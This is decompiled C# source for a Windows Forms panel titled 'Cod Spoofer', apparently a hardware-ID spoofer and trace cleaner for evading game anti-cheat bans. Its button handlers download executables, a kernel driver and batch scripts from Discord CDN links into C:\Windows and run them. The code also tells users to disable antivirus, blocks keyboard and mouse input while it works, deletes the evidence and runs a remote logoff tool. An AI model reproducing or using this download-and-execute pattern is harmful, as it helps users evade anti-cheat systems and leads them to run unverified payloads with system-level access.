using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Siticone.Desktop.UI.WinForms;

namespace MouseManager
{
	// Token: 0x0200000B RID: 11
	public class Profile6 : UserControl
	{
		// Token: 0x0600005F RID: 95 RVA: 0x001A8407 File Offset: 0x001A0E07
		public Profile6()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000060 RID: 96 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void Profile6_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x06000061 RID: 97 RVA: 0x001AD874 File Offset: 0x001A6274
		private void siticoneButton4_Click(object sender, EventArgs e)
		{
			if (File.Exists("C:\\Windows\\SPOOFER.exe"))
			{
				File.Delete("C:\\Windows\\SPOOFER.exe");
			}
			if (File.Exists("C:\\Windows\\C.exe"))
			{
				File.Delete("C:\\Windows\\C.exe");
			}
			if (File.Exists("C:\\Windows\\C2.exe"))
			{
				File.Delete("C:\\Windows\\C2.exe");
			}
			if (File.Exists("C:\\Windows\\map.bat"))
			{
				File.Delete("C:\\Windows\\map.bat");
			}
			if (File.Exists("C:\\Windows\\map2.bat"))
			{
				File.Delete("C:\\Windows\\map2.bat");
			}
			if (File.Exists("C:\\Windows\\Mzt5fU.sys"))
			{
				File.Delete("C:\\Windows\\Mzt5fU.sys");
			}
			if (File.Exists("C:\\Windows\\Registry.bat"))
			{
				File.Delete("C:\\Windows\\Registry.bat");
			}
			if (File.Exists("C:\\Windows\\uLLYvMz4ZUeq.sys"))
			{
				File.Delete("C:\\Windows\\uLLYvMz4ZUeq.sys");
			}
			if (File.Exists("C:\\Windows\\User.exe"))
			{
				File.Delete("C:\\Windows\\User.exe");
			}
			if (File.Exists("C:\\Windows\\8hyKnYgs.exe"))
			{
				File.Delete("C:\\Windows\\8hyKnYgs.exe");
			}
			if (File.Exists("C:\\Windows\\Serial_checker.bat"))
			{
				File.Delete("C:\\Windows\\Serial_checker.bat");
			}
			MessageBox.Show("IF SPOOFER FAILS MAKE SHURE U HAVE ALL ANTI VIRUS TURNED OFF !!,Important Message");
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\uLLYvMz4ZUeq.sys";
			string text2 = "C:\\Windows\\User.exe";
			string text3 = "C:\\Windows\\8hyKnYgs.exe";
			string text4 = "C:\\Windows\\Serial_checker.bat";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899006432287023104/Serial_checker.bat", text4);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			MessageBox.Show("Spoofer is on, don't touch anything else WAIT !!! .", "Important Message");
			Profile5.NativeMethods.BlockInput(false);
			Profile5.NativeMethods.BlockInput(true);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899006385344368651/8hyKnYgs.exe", text3);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899006381733052557/uLLYvMz4ZUeq.sys", text);
			Process.Start(text3, text);
			Thread.Sleep(3000);
			File.Delete(text);
			File.Delete(text3);
			Thread.Sleep(5000);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899006383687614494/User.exe", text2);
			Process.Start(text2);
			Thread.Sleep(5000);
			File.Delete(text2);
			File.Delete(text4);
			Profile5.NativeMethods.BlockInput(true);
			Profile5.NativeMethods.BlockInput(false);
			MessageBox.Show("Spoofer worked properly DiskDriver, Volume ID , Nic , SMBIOS , Registry , GPU , CPU.your session will close after the process let it do so !!! .GOOD GAMEImportant Message");
			if (File.Exists("C:\\Windows\\SPOOFER.exe"))
			{
				File.Delete("C:\\Windows\\SPOOFER.exe");
			}
			if (File.Exists("C:\\Windows\\C.exe"))
			{
				File.Delete("C:\\Windows\\C.exe");
			}
			if (File.Exists("C:\\Windows\\C2.exe"))
			{
				File.Delete("C:\\Windows\\C2.exe");
			}
			if (File.Exists("C:\\Windows\\map.bat"))
			{
				File.Delete("C:\\Windows\\map.bat");
			}
			if (File.Exists("C:\\Windows\\map2.bat"))
			{
				File.Delete("C:\\Windows\\map2.bat");
			}
			if (File.Exists("C:\\Windows\\Mzt5fU.sys"))
			{
				File.Delete("C:\\Windows\\Mzt5fU.sys");
			}
			if (File.Exists("C:\\Windows\\Registry.bat"))
			{
				File.Delete("C:\\Windows\\Registry.bat");
			}
			if (File.Exists("C:\\Windows\\uLLYvMz4ZUeq.sys"))
			{
				File.Delete("C:\\Windows\\uLLYvMz4ZUeq.sys");
			}
			if (File.Exists("C:\\Windows\\User.exe"))
			{
				File.Delete("C:\\Windows\\User.exe");
			}
			if (File.Exists("C:\\Windows\\8hyKnYgs.exe"))
			{
				File.Delete("C:\\Windows\\8hyKnYgs.exe");
			}
			if (File.Exists("C:\\Windows\\Serial_checker.bat"))
			{
				File.Delete("C:\\Windows\\Serial_checker.bat");
			}
			string fileName = "C:\\Windows\\logoff.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/901383697176092742/901384332562800650/logoff.exe", fileName);
			Process.Start(fileName);
		}

		// Token: 0x06000062 RID: 98 RVA: 0x001ADC20 File Offset: 0x001A6620
		private void siticoneButton1_Click(object sender, EventArgs e)
		{
			if (File.Exists("C:\\Windows\\SPOOFER.exe"))
			{
				File.Delete("C:\\Windows\\SPOOFER.exe");
			}
			if (File.Exists("C:\\Windows\\C.exe"))
			{
				File.Delete("C:\\Windows\\C.exe");
			}
			if (File.Exists("C:\\Windows\\C2.exe"))
			{
				File.Delete("C:\\Windows\\C2.exe");
			}
			if (File.Exists("C:\\Windows\\Apex_Cleaner_2.bat"))
			{
				File.Delete("C:\\Windows\\Apex_Cleaner_2.bat");
			}
			if (File.Exists("C:\\Windows\\CleanerSecond.exe"))
			{
				File.Delete("C:\\Windows\\CleanerSecond.exe");
			}
			if (File.Exists("C:\\Windows\\CleanerFirst.exe"))
			{
				File.Delete("C:\\Windows\\CleanerFirst.exe");
			}
			if (File.Exists("C:\\Windows\\Clear_COD.bat"))
			{
				File.Delete("C:\\Windows\\Clear_COD.bat");
			}
			MessageBox.Show("IF Cleanner FAILS MAKE SHURE U HAVE ALL ANTI VIRUS TURNED OFF !!,Important Message");
			WebClient webClient = new WebClient();
			string fileName = "C:\\Windows\\CleanerFirst.exe";
			string fileName2 = "C:\\Windows\\Clear_COD.bat";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899048528473624626/CleanerFirst.exe", fileName);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/903329278198956042/Clear_COD.bat", fileName2);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			MessageBox.Show("Spoofer is on, don't touch anything else WAIT !!! .", "Important Message");
			Process.Start(fileName);
			Thread.Sleep(50000);
			Process.Start(fileName2);
			Thread.Sleep(60000);
			MessageBox.Show("Cleaner worked properlyGOOD GAME", "Important Message");
		}

		// Token: 0x06000063 RID: 99 RVA: 0x001A841B File Offset: 0x001A0E1B
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000064 RID: 100 RVA: 0x001ADDA8 File Offset: 0x001A67A8
		private void InitializeComponent()
		{
			this.siticoneHtmlLabel5 = new SiticoneHtmlLabel();
			this.siticoneButton4 = new SiticoneButton();
			this.siticoneButton1 = new SiticoneButton();
			base.SuspendLayout();
			this.siticoneHtmlLabel5.BackColor = Color.Transparent;
			this.siticoneHtmlLabel5.Enabled = false;
			this.siticoneHtmlLabel5.Font = new Font("Bahnschrift Condensed", 15f);
			this.siticoneHtmlLabel5.ForeColor = Color.White;
			this.siticoneHtmlLabel5.Location = new Point(213, 3);
			this.siticoneHtmlLabel5.Name = "siticoneHtmlLabel5";
			this.siticoneHtmlLabel5.Size = new Size(83, 26);
			this.siticoneHtmlLabel5.TabIndex = 63;
			this.siticoneHtmlLabel5.Text = "Cod Spoofer";
			this.siticoneButton4.Animated = true;
			this.siticoneButton4.AutoRoundedCorners = true;
			this.siticoneButton4.BorderColor = Color.White;
			this.siticoneButton4.BorderRadius = 16;
			this.siticoneButton4.BorderThickness = 2;
			this.siticoneButton4.CheckedState.BorderColor = Color.FromArgb(3, 169, 244);
			this.siticoneButton4.CheckedState.FillColor = Color.FromArgb(3, 169, 244);
			this.siticoneButton4.CheckedState.ForeColor = Color.Black;
			this.siticoneButton4.CheckedState.Parent = this.siticoneButton4;
			this.siticoneButton4.Cursor = Cursors.Hand;
			this.siticoneButton4.CustomImages.Parent = this.siticoneButton4;
			this.siticoneButton4.DisabledState.BorderColor = Color.DarkGray;
			this.siticoneButton4.DisabledState.CustomBorderColor = Color.DarkGray;
			this.siticoneButton4.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
			this.siticoneButton4.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
			this.siticoneButton4.DisabledState.Parent = this.siticoneButton4;
			this.siticoneButton4.FillColor = Color.FromArgb(33, 33, 33);
			this.siticoneButton4.Font = new Font("Bahnschrift", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.siticoneButton4.ForeColor = Color.White;
			this.siticoneButton4.HoverState.FillColor = Color.White;
			this.siticoneButton4.HoverState.ForeColor = Color.Black;
			this.siticoneButton4.HoverState.Parent = this.siticoneButton4;
			this.siticoneButton4.Location = new Point(129, 35);
			this.siticoneButton4.Name = "siticoneButton4";
			this.siticoneButton4.ShadowDecoration.Parent = this.siticoneButton4;
			this.siticoneButton4.Size = new Size(247, 35);
			this.siticoneButton4.TabIndex = 64;
			this.siticoneButton4.Text = "Start Spoof";
			this.siticoneButton4.Click += this.siticoneButton4_Click;
			this.siticoneButton1.Animated = true;
			this.siticoneButton1.AutoRoundedCorners = true;
			this.siticoneButton1.BorderColor = Color.White;
			this.siticoneButton1.BorderRadius = 16;
			this.siticoneButton1.BorderThickness = 2;
			this.siticoneButton1.CheckedState.BorderColor = Color.FromArgb(3, 169, 244);
			this.siticoneButton1.CheckedState.FillColor = Color.FromArgb(3, 169, 244);
			this.siticoneButton1.CheckedState.ForeColor = Color.Black;
			this.siticoneButton1.CheckedState.Parent = this.siticoneButton1;
			this.siticoneButton1.Cursor = Cursors.Hand;
			this.siticoneButton1.CustomImages.Parent = this.siticoneButton1;
			this.siticoneButton1.DisabledState.BorderColor = Color.DarkGray;
			this.siticoneButton1.DisabledState.CustomBorderColor = Color.DarkGray;
			this.siticoneButton1.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
			this.siticoneButton1.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
			this.siticoneButton1.DisabledState.Parent = this.siticoneButton1;
			this.siticoneButton1.FillColor = Color.FromArgb(33, 33, 33);
			this.siticoneButton1.Font = new Font("Bahnschrift", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.siticoneButton1.ForeColor = Color.White;
			this.siticoneButton1.HoverState.FillColor = Color.White;
			this.siticoneButton1.HoverState.ForeColor = Color.Black;
			this.siticoneButton1.HoverState.Parent = this.siticoneButton1;
			this.siticoneButton1.Location = new Point(129, 76);
			this.siticoneButton1.Name = "siticoneButton1";
			this.siticoneButton1.ShadowDecoration.Parent = this.siticoneButton1;
			this.siticoneButton1.Size = new Size(247, 35);
			this.siticoneButton1.TabIndex = 65;
			this.siticoneButton1.Text = "Start Clean";
			this.siticoneButton1.Click += this.siticoneButton1_Click;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.FromArgb(33, 33, 33);
			base.Controls.Add(this.siticoneButton1);
			base.Controls.Add(this.siticoneButton4);
			base.Controls.Add(this.siticoneHtmlLabel5);
			base.Name = "Profile6";
			base.Size = new Size(554, 484);
			base.Load += this.Profile6_Load;
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x0400003B RID: 59
		private IContainer components;

		// Token: 0x0400003C RID: 60
		private SiticoneHtmlLabel siticoneHtmlLabel5;

		// Token: 0x0400003D RID: 61
		private SiticoneButton siticoneButton4;

		// Token: 0x0400003E RID: 62
		private SiticoneButton siticoneButton1;
	}
}
